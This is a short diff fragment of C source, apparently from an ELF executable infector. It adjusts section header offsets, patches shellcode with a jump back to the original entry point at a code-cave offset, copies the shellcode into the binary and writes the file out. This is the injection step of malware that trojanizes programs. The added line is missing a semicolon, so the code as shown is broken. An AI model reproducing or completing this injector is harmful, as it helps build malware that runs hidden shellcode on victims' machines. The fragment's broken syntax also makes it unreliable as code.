@@ -85,6 +85,7 @@ address=file_buffer+ehdr->e_shoff;
 	}
 	if (ehdr.e_shoff >= x) 
 	ehdr.e_shoff += PAGE_SIZE;
+	  char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
 memcpy(file_buffer+x,shellcodefixed,sclen);
   fwrite(file_buffer,1,size,f);
   free(shellcodefixed);
